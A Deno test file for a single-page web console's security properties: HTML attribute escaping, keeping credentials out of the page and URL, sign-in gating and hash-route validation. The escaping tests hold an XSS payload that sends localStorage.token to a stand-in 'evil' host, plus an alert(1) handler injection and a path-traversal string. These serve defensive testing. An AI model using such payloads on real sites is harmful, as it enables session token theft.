// The console's HTML escaping, and the rule that the page carries no credential.
//
// `esc` guards an XSS into the space's own origin: record-derived values (a kind name, a grant's
// `pattern` rendered as JSON inside `title="…"`) reach HTML ATTRIBUTES, so escaping `& < >` alone
// lets a value close the attribute and inject a new one. That bug was real and shipped.
//
// The console is deliberately one file with no build step, so there is no module to import. Rather
// than split it (which would trade a real architectural property for testability), the function is
// lifted out of the page source and evaluated here. The extraction fails loudly if the function is
// renamed or reshaped, which is the property that matters: this test cannot quietly stop testing
// anything.

import { assert, assertEquals } from "@std/assert";

/** Pull one top-level `function name(...) { … }` out of source text by brace balance. */
function extractFunction(source: string, name: string): string {
  const start = source.indexOf(`function ${name}(`);
  assert(start >= 0, `console no longer defines function ${name}(); update this test with it`);
  // Skip the PARAMETER LIST before looking for the body's opening brace. A default value that is
  // an object literal (`headers = {}`) otherwise reads as the body, and the extraction silently
  // returns `{}`: a test asserting on the contents of that would pass or fail for reasons having
  // nothing to do with the function.
  let paren = 0;
  let i = source.indexOf("(", start);
  for (; i < source.length; i++) {
    if (source[i] === "(") paren++;
    else if (source[i] === ")" && --paren === 0) break;
  }
  let depth = 0;
  for (let j = source.indexOf("{", i); j < source.length; j++) {
    if (source[j] === "{") depth++;
    else if (source[j] === "}" && --depth === 0) return source.slice(start, j + 1);
  }
  throw new Error(`unbalanced braces while extracting ${name}()`);
}

const html = await Deno.readTextFile(new URL("../src/ui/index.html", import.meta.url));
const esc = new Function(`${extractFunction(html, "esc")}; return esc;`)() as (s: unknown) => string;

Deno.test("console: esc escapes both quote characters, not only the markup ones", () => {
  // `"` is the one that mattered: a grant pattern is JSON, so it ALWAYS contains a double quote.
  assertEquals(esc(`a"b`), "a&quot;b");
  assertEquals(esc("a'b"), "a&#39;b");
  assertEquals(esc("<script>"), "&lt;script&gt;");
  assertEquals(esc("a&b"), "a&amp;b");
  assertEquals(esc("plain text"), "plain text");
});

Deno.test("console: a hostile value cannot break out of an attribute", () => {
  // The shape that shipped: a value ending the attribute and opening an event handler. After
  // escaping, no raw quote and no raw angle bracket survives, so there is nothing to break out of.
  const hostile = `" onerror="fetch('//evil/'+localStorage.token)" x="`;
  const escaped = esc(hostile);
  assert(!escaped.includes('"'), "no bare double quote survives");
  assert(!/[<>]/.test(escaped), "no bare angle bracket survives");
  assert(!escaped.includes("' "), "no bare single quote survives");

  // A realistic carrier: a grant pattern rendered into title="…".
  const pattern = JSON.stringify({ tag: `x" onmouseover="alert(1)` });
  assert(!esc(pattern).includes('"'));
});

Deno.test("console: esc coerces non-strings rather than throwing", () => {
  // It is called on whatever a record body holds, which is any JSON value, and a console that
  // throws while rendering shows a blank panel, not an error.
  assertEquals(esc(42), "42");
  assertEquals(esc(null), "null");
  assertEquals(esc(undefined), "undefined");
  assertEquals(esc({ a: 1 }), "[object Object]");
});

Deno.test("console: every record-derived value in the page goes through esc", () => {
  // A cheap structural check with a real failure mode behind it: the escaping bug was not that
  // `esc` was wrong everywhere, it was that ONE call site interpolated raw. Any `${…}` inside an
  // HTML attribute in a template literal must name esc.
  // Two forms are accepted, and NOT "any bare identifier": a bare `${rec.kind}` in an attribute is
  // precisely the bug, so the check must not wave through property access.
  //   - anything routed through esc(…)
  //   - a ternary whose branches are string LITERALS, which cannot carry record data whatever the
  //     condition reads
  const literalTernary = /\?\s*(["'])[^"']*\1\s*:\s*(["'])[^"']*\2\s*$/;
  const offenders: string[] = [];
  for (const m of html.matchAll(/(?:title|value|href|src|class|id)="[^"\n]*\$\{([^}]*)\}/g)) {
    const expr = m[1];
    if (!expr.includes("esc(") && !literalTernary.test(expr)) offenders.push(m[0]);
  }
  assertEquals(offenders, [], "these attribute interpolations do not escape their value");
});

Deno.test("console: the served page carries no credential", () => {
  // `GET /` is public so the console can bootstrap in `--auth required` mode, which means anything
  // baked into this page is readable by anyone who can reach the port, and a harvested operator
  // token authorizes every verb. Never inject a credential here; the console asks for one at
  // runtime and keeps it in sessionStorage.
  assert(
    !/__RADIA_[A-Z_]*TOKEN__/.test(html),
    "the page carries a token placeholder, so something on the server may substitute a credential into it",
  );
  const tokenShaped = [...html.matchAll(/\b[0-9a-f]{48}\b/g)].map((m) => m[0]);
  assertEquals(tokenShaped, [], "a credential-shaped literal is baked into the served page");
});

Deno.test("console: no event handler interpolates a credential", () => {
  // The console can now MINT a session token (the Auth tab, operator only) and offers two buttons
  // beside it. Interpolating that token into `onclick="…"` would write a live credential into the
  // DOM as executable markup, where any injection elsewhere on the page can read it back out. It is
  // held in a variable (`MINTED`) that the handlers name instead.
  //
  // This checks the credential specifically, not every handler interpolation. The three existing
  // `onclick="…('${rec.id}')"` sites carry server-assigned ULIDs and are out of scope here.
  const offenders: string[] = [];
  for (const m of html.matchAll(/\son[a-z]+="[^"\n]*\$\{([^}]*)\}/g)) {
    if (/token|credential|secret/i.test(m[1])) offenders.push(m[0]);
  }
  assertEquals(offenders, [], "an event handler attribute interpolates something token-shaped");
});

Deno.test("console: minting parses a grant list the same way the CLI does", () => {
  // `radia login human:alice --grant message:put,query` and the Auth tab's grant box must mean the
  // same thing, or the console teaches a syntax nothing else accepts.
  const parseGrants = new Function(`${extractFunction(html, "parseGrants")}; return parseGrants;`)() as (
    who: string,
    text: string,
  ) => { principal: string; kind: string; operations: string[] }[];

  assertEquals(parseGrants("human:alice", "message:put,query"), [
    { principal: "human:alice", kind: "message", operations: ["put", "query"] },
  ]);
  // Several grants, whitespace-separated. Whitespace SEPARATES grants, so it cannot also appear
  // inside one: `message:put, query` is two grants, the second of which is malformed. That is the
  // CLI's rule too (it splits argv), and matching it is the point of this test.
  assertEquals(parseGrants("human:alice", "  message:put,query   conversation:query "), [
    { principal: "human:alice", kind: "message", operations: ["put", "query"] },
    { principal: "human:alice", kind: "conversation", operations: ["query"] },
  ]);
  // Empty is legitimate: an app (the chat) may assign the session's grants itself.
  assertEquals(parseGrants("human:alice", ""), []);
  assertEquals(parseGrants("human:alice", "   "), []);

  // Malformed input throws rather than silently minting a grant on kind "" or with no operations.
  // A grant that quietly means nothing is worse than a rejected form: it looks assigned.
  for (const bad of ["message", ":put", "message:"]) {
    let threw = false;
    try { parseGrants("human:alice", bad); } catch { threw = true; }
    assert(threw, `'${bad}' should be rejected, not parsed into a grant`);
  }
});

Deno.test("console: no credential means no request, not an operator default", () => {
  // The space's open mode answers a header-less request as `human:local`, the operator. A console
  // that leaned on that held the entire control plane because nobody had typed anything: the
  // largest possible authority acquired the least visible way. The page now gates on a token in
  // EVERY mode, so the shortcut stays available to curl and is unreachable from the browser.
  assert(
    /PUBLIC_PATHS\s*=\s*new Set\(\["\/v0\/health"\]\)/.test(html),
    "the public-path allowlist is gone or widened; only /v0/health may be called unauthenticated",
  );
  // The guard must sit in `api()`, the one funnel every panel uses. A per-caller check is a check
  // somebody will forget to add to the next panel.
  const api = extractFunction(html, "api");
  assert(/AUTH_TOKEN/.test(api) && /PUBLIC_PATHS/.test(api), "api() does not gate on the token");
  assert(/return\s*\{\s*ok:\s*false,\s*status:\s*401/.test(api), "api() does not short-circuit unauthenticated calls");

  // And the gate has to actually run: a sign-in screen nothing displays is decoration.
  assert(/id="signin"/.test(html), "no sign-in panel");
  assert(/\nstart\(\);/.test(html), "the sign-in gate is never invoked at init");
});

Deno.test("console: a pasted token is verified before it is stored", () => {
  // Storing an unusable token leaves the console signed in and uniformly broken: every panel
  // reports 401 and nothing says the credential was the problem.
  const signIn = extractFunction(html, "signIn");
  const verifyAt = signIn.indexOf("/v0/health");
  const storeAt = signIn.indexOf("useToken");
  assert(verifyAt >= 0, "signIn() does not verify the token against the space");
  assert(storeAt > verifyAt, "signIn() stores the token before verifying it");
});

Deno.test("console: an expired token returns to sign-in, never reports 'offline'", () => {
  // `/v0/health` is public, but a PRESENTED token must still resolve, so a bad or expired one 401s
  // on the very endpoint that would otherwise prove the space is up. The console called that
  // "offline": it named the wrong thing and left no way back to the sign-in screen, so the tab was
  // dead until you cleared sessionStorage by hand. Run tokens expire in ~15 minutes, so this is how
  // a session ordinarily ends.
  const loadHealth = extractFunction(html, "loadHealth");
  assert(/status === 401/.test(loadHealth), "loadHealth does not distinguish a 401 from an unreachable space");
  assert(/showSignIn\(/.test(loadHealth), "loadHealth cannot return to the sign-in screen");

  // The sign-in screen has to be reachable from BOTH directions: page load with no token, and a
  // credential dying mid-session. One entry point, so the two cannot drift apart.
  const showSignIn = extractFunction(html, "showSignIn");
  assert(/sessionStorage\.removeItem/.test(showSignIn), "the dead credential is kept, so every poll re-enters this path");
  assert(/clearInterval\(healthTimer\)/.test(showSignIn), "the health poll keeps running against a dead token");

  // Even when the space really is unreachable, the token stays changeable: the pill is the only
  // way to reach `setToken` from that state.
  assert(/pill[^`]*offline/.test(loadHealth) && /onclick="setToken\(\)"[^`]*offline/.test(loadHealth), "the offline pill is not clickable");
});

Deno.test("console: the page's script parses", () => {
  // No build step is a real architectural property here, and this is its one cost: a stray brace
  // ships a console that is blank in every tab, and every other test in this file reads the source
  // as TEXT, so all of them keep passing. `new Function` compiles the body without running it,
  // which is the whole check.
  const blocks = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)];
  assertEquals(blocks.length, 1, "the page grew a second script block; compile that one too");
  new Function(blocks[0][1]);
});

// ---- routing: the URL is the view ----

const ulidLine = html.match(/^const ULID = .*$/m);
assert(ulidLine, "the console no longer defines a top-level ULID pattern; update this test with it");
const makeReadRoute = new Function(
  "location",
  `${ulidLine[0]}\n${extractFunction(html, "readRoute")}; return readRoute;`,
) as (loc: { hash: string }) => () => { tab: string; id: string; params: URLSearchParams };
const routeOf = (hash: string) => makeReadRoute({ hash })();

Deno.test("console: a hash names a tab and a selection, and an empty one is the overview", () => {
  assertEquals(routeOf("").tab, "overview");
  assertEquals(routeOf("#").tab, "overview");
  assertEquals(routeOf("#flows").tab, "flows");
  const r = routeOf("#records/01KZ6X7QXBSV7PS9A9WS8VT6EJ");
  assertEquals(r.tab, "records");
  assertEquals(r.id, "01KZ6X7QXBSV7PS9A9WS8VT6EJ");
});

Deno.test("console: a record id out of the URL is validated before it becomes a request", () => {
  // The id reaches an API path and a render. Anyone can type anything here, so a value that is not
  // an id is DROPPED rather than forwarded: the tab still opens, and nothing odd is fetched.
  for (const junk of ["notaulid", "../../etc/passwd", "<script>", "01KZ6X7QXBSV7PS9A9WS8VT6E", ""]) {
    assertEquals(routeOf(`#records/${junk}`).id, "", `'${junk}' was accepted as a record id`);
    assertEquals(routeOf(`#records/${junk}`).tab, "records", "a bad id must not also lose the tab");
  }
});

Deno.test("console: the Flows knobs travel in the hash, so a comparison can be sent to someone", () => {
  // Those knobs exist to be varied and compared (too fine and every flow is unique, too coarse and
  // everything is one flow). A comparison nobody can link to is a comparison nobody can check.
  const r = routeOf("#flows?granularity=kind&counts=exact&min=3");
  assertEquals(r.tab, "flows");
  assertEquals(r.params.get("granularity"), "kind");
  assertEquals(r.params.get("counts"), "exact");
  assertEquals(r.params.get("min"), "3");
  // A knob is validated where it is applied, not here; what must hold is that a query string does
  // not leak into the tab name and open the wrong view.
  assertEquals(routeOf("#graph?x=1").tab, "graph");
});

/**
 * The router, RUN rather than read. Every other check in this file reads the page as text, which
 * cannot see whether `applyRoute` wires the tab, the selection and the knobs in the right order. A
 * stub DOM is the cost of running it; the alternative is a build step, which the console exists
 * without on purpose.
 */
function newRouter(hash: string) {
  const tabs = ["overview", "records", "graph", "flows"];
  const harness = `
    ${ulidLine![0]}
    let lastWritten = "";
    const calls = [];
    const inputs = { "fl-gran": {value:"kind+agent"}, "fl-counts": {value:"bucketed"}, "fl-min": {value:"1"} };
    const $ = (id) => inputs[id];
    const CSS = { escape: (s) => s.replace(/[^a-zA-Z0-9+_-]/g, "") };
    const buttons = ${JSON.stringify(tabs)}.map((t) => ({ dataset: { tab: t }, classList: { add(){}, remove(){} } }));
    const document = {
      querySelector: (sel) => buttons.find((b) => sel.includes('data-tab="' + b.dataset.tab + '"')) || null,
      querySelectorAll: () => [],
    };
    function selectTab(b) { calls.push("tab:" + b.dataset.tab); }
    function showDetail(id) { calls.push("detail:" + id); }
    function showGraph(id) { calls.push("graph:" + id); }
    ${extractFunction(html, "readRoute")}
    ${extractFunction(html, "navigate")}
    ${extractFunction(html, "applyRoute")}
    return { navigate, applyRoute, calls, inputs };
  `;
  return new Function("location", harness)({ hash }) as {
    navigate: (t: string, id?: string) => void;
    applyRoute: () => void;
    calls: string[];
    inputs: Record<string, { value: string }>;
  };
}

Deno.test("console: a deep link opens the tab AND restores the selection", () => {
  const id = "01KZ6X7QXBSV7PS9A9WS8VT6EJ";
  const rec = newRouter(`#records/${id}`);
  rec.applyRoute();
  assertEquals(rec.calls, ["tab:records", `detail:${id}`]);

  const graph = newRouter(`#graph/${id}`);
  graph.applyRoute();
  assertEquals(graph.calls, ["tab:graph", `graph:${id}`]);

  // An unknown tab lands somewhere real rather than on a blank page, and drops the selection with
  // it: a record id means nothing once the tab it belonged to is gone.
  const junk = newRouter(`#nosuchtab/${id}`);
  junk.applyRoute();
  assertEquals(junk.calls, ["tab:overview"]);
});

Deno.test("console: a knob from the URL is applied before the loader, and validated first", () => {
  // Order is the whole of it: entering the Flows tab runs its loader, and the loader reads these
  // inputs. Applied after, the URL would say one thing and the table show another.
  const good = newRouter("#flows?granularity=kind&counts=exact&min=4");
  good.applyRoute();
  assertEquals(good.calls, ["tab:flows"]);
  assertEquals(good.inputs["fl-gran"].value, "kind");
  assertEquals(good.inputs["fl-counts"].value, "exact");
  assertEquals(good.inputs["fl-min"].value, "4");

  // Anyone can type anything here. A value the endpoint would reject falls back to the default
  // rather than travelling on to become a 400 that reads as the space being broken.
  const bad = newRouter("#flows?granularity=bogus&counts=nope&min=-3");
  bad.applyRoute();
  assertEquals(bad.inputs["fl-gran"].value, "kind+agent");
  assertEquals(bad.inputs["fl-counts"].value, "bucketed");
  assertEquals(bad.inputs["fl-min"].value, "1");
});

Deno.test("console: the route is applied INSIDE the sign-in gate, never at page load", () => {
  // The old `?tab=` deep link ran unconditionally, after `start()` had already bailed to the sign-in
  // screen. Opening the Feed or Space tab starts a 1s poll, so a deep link with no token left those
  // polls running behind the overlay, every call short-circuiting to a 401 with nothing on screen to
  // say so. The route may only be applied once a credential exists.
  const start = extractFunction(html, "start");
  assert(/applyRoute\(\)/.test(start), "start() never applies the route, so a deep link does nothing");
  const gate = start.indexOf("if (!AUTH_TOKEN) return showSignIn");
  assert(gate >= 0 && start.indexOf("applyRoute()") > gate, "start() applies the route before checking for a token");
  assert(!/\napplyRoute\(\);/.test(html), "the route is applied at top level, outside the gate");

  // And the sign-in screen must leave the URL alone: that is the whole of how a view survives a
  // credential expiring, since `useToken` reloads the same URL.
  const showSignIn = extractFunction(html, "showSignIn");
  assert(!/location\.hash/.test(showSignIn), "showSignIn touches the hash, so the view is lost on re-auth");
});

Deno.test("console: navigation goes through the URL, so the address bar cannot drift from the view", () => {
  // A tab that mutates the DOM directly and leaves the hash behind is worse than no routing at all:
  // the URL then names a view the page is not showing, and sharing it sends the wrong place.
  assert(
    /#nav button"\)\.forEach\(\(b\) => b\.onclick = \(\) => navigate\(/.test(html),
    "the nav buttons no longer navigate; they apply a tab directly and the hash goes stale",
  );
  const navigate = extractFunction(html, "navigate");
  assert(/location\.hash = next/.test(navigate), "navigate() does not write the URL");
  assert(/applyRoute\(\)/.test(navigate), "navigate() writes the URL without applying it");
});

Deno.test("console: no credential is ever written into the URL", () => {
  // The hash is shareable, lands in browser history, and is visible over a shoulder. A token in it
  // would be a credential leak by design rather than by accident.
  const offenders = [...html.matchAll(/location\.hash\s*=\s*([^;\n]*)/g)]
    .map((m) => m[1])
    .filter((expr) => /token|credential|secret|MINTED/i.test(expr));
  assertEquals(offenders, [], "a credential is assigned into location.hash");
});

Deno.test("console: a network failure is an outcome, not an exception", () => {
  // `fetch` REJECTS when nothing is listening, and every caller reads `{ok, status}`. An uncaught
  // rejection left a stopped space showing the last good render, saying nothing.
  const api = extractFunction(html, "api");
  assert(/catch\s*\(e\)\s*\{[\s\S]*status:\s*0/.test(api), "api() does not turn an unreachable space into a result");
});
